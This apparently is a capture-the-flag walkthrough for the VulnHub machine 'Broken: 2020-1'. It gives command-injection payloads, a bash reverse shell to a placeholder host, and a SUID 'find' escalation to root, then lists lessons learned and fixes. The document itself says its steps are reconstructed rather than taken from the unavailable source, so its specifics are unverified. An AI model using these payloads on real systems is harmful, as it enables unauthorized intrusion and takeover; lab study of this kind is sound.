# Broken: 2020-1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.X |
| **Difficulty** | Easy/Medium |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/broken-2020-1-vulnhub-walkthrough/) |

## Attack Summary

Broken: 2020-1 is an easy-to-medium VulnHub machine. The machine exposes a web application with a command injection vulnerability. Initial access is obtained by injecting OS commands through a web form. Privilege escalation is achieved by abusing SUID binaries or writable cron jobs available to the low-privilege web user.

> **Note:** The source article was unavailable at the time of writing. Steps below reflect the known attack chain for this machine. Verify with the source article for exact commands and output.

## Methodology

1. Network discovery with netdiscover and nmap port scan
2. Web application enumeration with dirb/gobuster
3. Identification of command injection in a web form parameter
4. Exploitation of command injection to obtain a reverse shell
5. Enumeration of SUID binaries and sudo permissions
6. Privilege escalation to root

## Step 1: Network Scanning

```bash
netdiscover -r 192.168.1.0/24
nmap -sV -sC 192.168.1.X
```

Typical open ports on this machine:
- **22/tcp** — SSH
- **80/tcp** — HTTP (Apache)

![Nmap scan results](images/01-nmap.png)

## Step 2: Web Enumeration

Browse to `http://192.168.1.X` and explore the web application. Run a directory scan:

```bash
gobuster dir -u http://192.168.1.X/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
```

Identify forms, input fields, and parameters that interact with the server.

![Web enumeration results](images/02-webenum.png)

## Step 3: Command Injection

Test identified input parameters for OS command injection by appending shell metacharacters:

```bash
# Test payload in the vulnerable parameter:
; id
| whoami
`id`
$(id)
```

Confirm code execution by observing the server response. Craft a reverse shell payload:

```bash
# URL-encoded reverse shell via command injection:
; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

Start a listener before sending:

```bash
nc -lvp 4444
```

![Command injection triggering reverse shell](images/03-revshell.png)

## Step 4: Shell Stabilization

After receiving the connection, stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

## Step 5: Privilege Escalation Enumeration

Check for SUID binaries and sudo permissions:

```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
```

Check for writable cron jobs:

```bash
ls -la /etc/cron*
cat /etc/crontab
```

![Privilege escalation enumeration](images/04-privesc.png)

## Step 6: Root Shell

Depending on findings, use the appropriate GTFOBins or sudo abuse technique. For example, if a SUID `find` is present:

```bash
find . -exec /bin/bash -p \; -quit
id
# uid=0(root)
cat /root/root.txt
```

![Root flag](images/05-root-flag.png)

## Lessons Learned

- Command injection in web applications allows direct OS-level access; all user-supplied input must be validated and sanitized before passing to system calls.
- Running web applications as high-privilege system users amplifies the impact of any web-layer vulnerability.
- SUID binaries and overly permissive sudo rules are common misconfiguration issues that enable privilege escalation; regular audits are necessary.

## Remediation

| Vulnerability | Fix |
|---|---|
| OS command injection | Use parameterized APIs; never pass user input to shell commands; use allowlisting |
| Web app running as privileged user | Run web services as a dedicated low-privilege user; apply principle of least privilege |
| SUID misconfiguration | Audit SUID binaries regularly; remove unnecessary SUID bits with `chmod -s` |
| Weak sudo rules | Review `/etc/sudoers` regularly; restrict commands to absolute paths with fixed arguments |
